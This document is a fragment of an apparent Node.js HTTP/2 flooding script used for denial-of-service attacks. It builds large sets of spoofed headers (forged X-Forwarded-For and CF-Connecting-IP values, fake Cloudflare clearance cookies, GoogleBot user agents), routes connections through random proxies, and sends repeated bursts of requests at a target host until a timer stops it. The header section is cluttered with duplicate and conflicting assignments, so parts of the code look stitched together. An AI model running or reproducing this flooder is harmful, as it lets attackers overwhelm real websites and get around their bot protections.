headers["accept-language"] = randomHeaders['accept-language'];
headers["accept-language"] = lang;
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["referer"] = Ref;
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["accept-encoding"] = randomHeaders['accept-encoding'];
headers["accept-encoding"] = encoding;
headers["cache-control"] = randomHeaders['cache-control'];
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["x-content-type-options"] = "nosniff";
headers["X-Forwarded-For"] = spoofed;
headers["TE"] = "trailers";
headers["pragma"] = randomHeaders['pragma'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
headers["X-Forwarded-Proto"] = HTTPS;
headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = pl;
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["upgrade-insecure-requests"] = "1";
headers["vary"] = randomHeaders['vary'];
headers["x-requested-with"] = "XMLHttpRequest";
headers["TE"] = trailers;
headers["set-cookie"] = randomHeaders['set-cookie'];
headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
headers["Server"] = randomHeaders['Server'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
headers["alt-svc"] = randomHeaders['alt-svc'];
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;
headers["User-Agent"] = randomHeaders['User-Agent'];
headers["user-agent"] = uap;
headers["User-Agent"] = uap;
headers["CF-Connecting-IP"] = fakeIP;
headers["CF-RAY"] = "randomRayValue";
headers["CF-Visitor"] = "{'scheme':'https'}";
headers["X-Forwarded-For"] = spoofed
headers["X-Forwarded-For"] = spoofed
headers["X-Forwarded-For"] = spoofed
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = spoofed;
headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
headers["referer"] = Ref;
headers["sec-fetch-mode"] = "navigate"; 
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-user"] = "?1";
headers["TE"] = "trailers";
headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
headers["sec-fetch-site"] = site1;
headers["x-requested-with"] = "XMLHttpRequest";
headers.GET = ' / HTTP/2';
headers[':path'] = parsedTarget.path;
headers[':scheme'] = 'https';
headers.Referer = 'https://google.com';
headers.accept_header = xn;
headers['accept-language'] = badag;
headers['accept-encoding'] = enc; 
headers.Connection = 'keep-alive';
headers['upgrade-insecure-requests'] = '1';
headers.TE = 'trailers';
headers['x-requested-with'] = 'XMLHttpRequest';
headers['Max-Forwards'] = '10';
headers.pragma = 'no-cache';
headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194'; 
headers["Real-IP"] = spoofed;
headers["referer"] = Ref;
headers[":authority"] = parsedTarget.host + ":80"; // Include port 80 in :authority header
headers["origin"] = "https://" + parsedTarget.host + ":80"; // Include port 80 in origin header
headers["Via"] = "1.1 " + parsedTarget.host + ":80"; // Include port 80 in Via header
headers[":authority"] = parsedTarget.host + ":443"; // Include port 80 in :authority header
headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
headers["Via"] = "1.1 " + parsedTarget.host + ":443"; // Include port 80 in Via header
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.1 header
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.2 header
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + "; ma=7200" });   // Add the http/2 header 
headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.1 header with port 80
headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.2 header with port 80
headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + ":80; ma=7200" });   // Add the http/2 header with port 80
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.1 header with port 443
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.2 header with port 443
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + ":443; ma=7200" });        // Add the http/2 header with port 443  
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = spoofed;
headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["accept-language"] = lang; 
headers["accept-encoding"] = encoding;
headers["upgrade-insecure-requests"] = "1"; 
headers["accept"] = accept;
headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
headers["referer"] = Ref;
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-user"] = "?1";
headers["TE"] = "trailers";
headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
headers["cache-control"] = control;
 //headers["sec-ch-ua"] = uaas;
headers["accept-encoding"] = encoding;
 //headers["cdn-loop"] = "cloudflare";
 //headers["sec-ch-ua-mobile"] = "?0";
headers["upgrade-insecure-requests"] = "1";
headers["x-requested-with"] = "XMLHttpRequest";
 
  function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, async (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ecdhCurve: "X25519:prime256v1",
            ciphers: cipper,
            secureProtocol: "TLS_method",
            ALPNProtocols: ['h2'],
            //session: crypto.randomBytes(16),
            //timeout: 1000,
        };

         const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = await http2.connect(parsedTarget.href, {
             protocol: "https",
             settings: {
            headerTableSize: 8192,
            maxConcurrentStreams: 1000,
            initialWindowSize: 65535,
            maxHeaderListSize: 16384,
            maxFrameSize: 32768 * 2,
            enablePush: false,
          },
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 8192,
            maxConcurrentStreams: 1000,
            initialWindowSize: 65535,
            maxHeaderListSize: 16384,
            maxFrameSize: 32768 * 2,
            enablePush: false,
          });
		 
         client.on("connect", async () => {
            const IntervalAttack = setInterval(() => {
function shuffleObject(obj) {
  const keys = Object.keys(obj);

  for (let i = keys.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [keys[i], keys[j]] = [keys[j], keys[i]];
  }

  const shuffledObject = {};
  for (const key of keys) {
    shuffledObject[key] = obj[key];
  }

  return shuffledObject;
}
					const shuffledHeaders = shuffleObject({
					...headers,
					"user-agent": generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 " + generateRandomString(6,20),
					"accept": accept,
					"referer": "https://www." + randstr(5) + ".com",
					"accept-language": lang,
					"x-forwarded-proto": "https",
					//"sec-fetch-site": "none",
					//"sec-fetch-mode": "navigate",
					//"sec-fetch-user": "?1",
					...multi,
					...multi2,
					...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
					...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
					...rateHeaders3[Math.floor(Math.random()*rateHeaders3.length)],
					//"DNT": "1",
					...(Math.random() < 0.5 ? {"rtt": Math.floor(Math.random() * 500) + 100} : {}),
					...(Math.random() < 0.5 ? {"downlink": Math.random() < 0.5 ? "0.5" : "1.0"} : {}),
					//...(Math.random() < 0.5 && {"x-forwarded-for": spoofed}),
					//...(Math.random() < 0.5 ? {"ect": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)]} : {}),
					...(Math.random() < 0.5 ? {"device-memory": Math.floor(Math.random() * 8) + 1} : {}),
					...(Math.random() < 0.5 ? {
            					"NEL": JSON.stringify({
                					report_to: "default",
                					max_age: 2592000,
                					include_subdomains: true
            					})
        					} : {}),
				    ...rateHeaders4[Math.floor(Math.random()*rateHeaders4.length)],
					});
					
				//const headersArray = [shuffledHeaders, suffledHeaders1];
				//var promo = headersArray[Math.floor(Math.random() * headersArray.length)]
				//console.log(promo);
				const request1 = client.request(shuffledHeaders);
request1.on('response', (headers, flags) => {
    console.log("Status code " + request1.id + ": " + headers[http2.constants.HTTP2_HEADER_STATUS]);
});
                for (let i = 0; i < args.Rate; i++) {
					const request = client.request(shuffledHeaders);

                    client.on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
                    request.end();
                }
            }, 400); 
            //});
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
